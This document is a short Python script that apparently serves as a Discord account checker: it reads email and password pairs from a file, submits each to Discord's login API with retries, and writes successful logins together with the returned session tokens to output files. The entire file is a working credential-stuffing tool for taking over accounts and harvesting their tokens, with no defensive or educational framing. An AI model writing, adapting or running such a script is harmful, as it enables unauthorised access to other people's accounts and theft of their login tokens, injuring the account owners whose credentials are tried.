import requests, json

with open('config/data.txt', 'r') as file:
    data = file.read()

lines = data.split('\n')
lines = [line for line in lines if line]
account_data = {}

separator = input('Data separator: ')

for line in lines:
    email, password = line.split(separator)

    account_data[email] = password

all_tried = False

while not all_tried:
    all_tried = True
    for email, password in account_data.items():
        success = False
        retries = 0
        max_retries = 5
        
        while not success and retries < max_retries:
            retries += 1
            print(f'Loading | Email: {email} | Password: {password} | Attempt: {retries}')
            url = 'https://discord.com/api/v9/auth/login'
            payload = {'login': email, 'password': password}

            request = requests.post(url, json=payload)
            if request.status_code == 200:
                success = True
                all_tried = False
                print(f'Successfully logged into {email} | {password}')
                response_json = json.loads(request.text)

                token = response_json.get('token')

                with open('output/data.txt', 'a') as file:
                    file.write(f'{email} | {password} | {token}\n')

                with open('output/tokens.txt', 'a') as file:
                    file.write(f'{token}\n')

                print('Wrote email | password | token to output/data.txt\nWrote token to output/tokens.txt')
            else:
                print(f'Failed to login to {email} | {password} | Status code: {request.status_code}')
